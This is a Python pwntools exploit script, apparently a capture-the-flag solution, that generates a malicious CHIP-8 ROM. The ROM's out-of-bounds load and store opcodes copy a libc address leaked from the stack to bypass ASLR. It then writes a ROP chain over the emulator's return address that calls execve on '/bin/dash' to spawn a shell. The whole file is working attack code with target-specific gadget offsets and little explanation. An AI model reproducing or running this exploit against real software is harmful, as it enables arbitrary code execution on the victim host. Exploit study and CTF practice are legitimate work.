# Generate a shellcode ROM

from pwn import *

# 6xkk - LD Vx, byte
# 7xkk - ADD Vx, byte
# 8xy0 - LD Vx, Vy
# 8xy4 - ADD Vx, Vy
# Annn - LD I, addr
# Ex9E - SKP Vx
# Fx1E - ADD I, Vx
# Fx55 - LD [I], Vx
# Fx65 - LD Vx, [I]
# 00FD - EXIT

local = False

if local:
    libc = ELF('/usr/lib/libc.so.6')
    leak_off = libc.symbols['__libc_start_main'] + 243
else:
    libc = ELF('libc.so.6')
    leak_off = libc.symbols['__libc_start_main'] + 241 # 0x20431
    pop_rdi_gadget = 0x00101461
    one_gadget_off = 0x3f306
far_leak_loc_off = 0x18f8
near_leak_loc_off = 0x1026
ret_addr_off = 6360

# 6392| 0x7fffffffe058 --> 0x7ffff7a59223 (<__libc_start_main+241>:	mov    edi,eax)

# Set I to the value of off
def seek_I(off):
    assert off > 0xfff
    assert off < 2 ** 16
    p = ''
    # Set I to off
    p += '\xAf\xff' # LD I, 0xfff
    reg_I = 0xfff
    while reg_I < off:
        if off - reg_I < 0xff:
            p += '\x6a' + chr(off - reg_I) # LD Va, (off - reg_I)
            reg_I += off - reg_I
        else:
            p += '\x6a\xff' # LD Va, 0xff
            reg_I += 0xff
        p += '\xfa\x1e' # ADD I, Va
    return p

# Read the 64 bit value at off into V0-V7
def read64(off):
    p = ''
    p += seek_I(off)
    p += '\xf7\x65' # LD V7, [I]
    return p

# Write the 64 bit value in V0-V7 to off
def write64(off):
    p = ''
    p += seek_I(off)
    p += '\xf7\x55' # LD [I], V7
    return p

# Add the immediate val to the 64 bit value stored in V0-V7
def add64i(val):
    p = ''
    p += '\x68' + p64(val)[0] # LD V8, p64(val)[0]
    p += '\x80\x84' # ADD V0, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x81\x94' # ADD, V1, V9
    p += '\x68' + p64(val)[1] # LD V8, p64(val)[1]
    p += '\x81\x84' # ADD V1, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x82\x94' # ADD, V2, V9
    p += '\x68' + p64(val)[2] # LD V8, p64(val)[2]
    p += '\x82\x84' # ADD V2, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x83\x94' # ADD, V3, V9
    p += '\x68' + p64(val)[3] # LD V8, p64(val)[3]
    p += '\x83\x84' # ADD V3, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x84\x94' # ADD, V4, V9
    p += '\x68' + p64(val)[4] # LD V8, p64(val)[4]
    p += '\x84\x84' # ADD V4, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x85\x94' # ADD, V5, V9
    p += '\x68' + p64(val)[5] # LD V8, p64(val)[5]
    p += '\x85\x84' # ADD V5, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x86\x94' # ADD, V6, V9
    p += '\x68' + p64(val)[6] # LD V8, p64(val)[6]
    p += '\x86\x84' # ADD V6, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x87\x94' # ADD, V7, V9
    p += '\x68' + p64(val)[7] # LD V8, p64(val)[7]
    p += '\x87\x84' # ADD V7, V8
    return p

# Load the 64 bit value val into V0-V7
def ld64(val):
    p = ''
    p += '\x60' + p64(val)[0] # LD V0, p64(val)[0]
    p += '\x61' + p64(val)[1] # LD V0, p64(val)[1]
    p += '\x62' + p64(val)[2] # LD V0, p64(val)[2]
    p += '\x63' + p64(val)[3] # LD V0, p64(val)[3]
    p += '\x64' + p64(val)[4] # LD V0, p64(val)[4]
    p += '\x65' + p64(val)[5] # LD V0, p64(val)[5]
    p += '\x66' + p64(val)[6] # LD V0, p64(val)[6]
    p += '\x67' + p64(val)[7] # LD V0, p64(val)[7]
    return p

# Use a stack leak to compute the absolute address of a gadget at `off` and
# place it on the ropchain. `ropchain_len` is the current length of the
# ropchain in qwords.
def rel_gad(ropchain_len, off):
    assert off > leak_off
    p = ''
    p += read64(near_leak_loc_off)
    p += add64i(off - leak_off)
    p += write64(ret_addr_off + ropchain_len * 8)
    return p

# Add `data` to the ropchain verbatim
def abs_gad(ropchain_len, data):
    p = ''
    p += ld64(data)
    p += write64(ret_addr_off + ropchain_len * 8)
    return p

# Moves the leak used to bypass ASLR to a lower address to prevent clobbering
# by the ropchain
def setup_leak():
    p = ''
    p += read64(far_leak_loc_off)
    p += write64(near_leak_loc_off)
    return p

p = ''
p += setup_leak()
# leak_off:      0x00020431
p += rel_gad( 0, 0x000f5295)
p += rel_gad( 1, 0x00399080)
p += rel_gad( 2, 0x00035578)
p += abs_gad( 3, u64('/bin/das'))
p += rel_gad( 4, 0x0002c42c)
p += rel_gad( 5, 0x00058552)
p += rel_gad( 6, 0x00399088)
p += rel_gad( 7, 0x00035578)
p += abs_gad( 8, u64('h\x00\x00\x00\x00\x00\x00\x00'))
p += rel_gad( 9, 0x0002c42c)
p += rel_gad(10, 0x00101461)
p += rel_gad(11, 0x00399080)
p += rel_gad(12, 0x0011b879)
p += rel_gad(13, 0x00399089)
p += rel_gad(14, 0x000f5295)
p += rel_gad(15, 0x00399089)
p += rel_gad(16, 0x00035578)
p += abs_gad(17, 59)
p += rel_gad(18, 0x000a87e5)
p += '\x00\xfd' # EXIT

print 'Writing payload to ROM...'
with open('PAYLOAD.ROM', 'w') as f:
    f.write(p)
print 'PAYLOAD.ROM written'
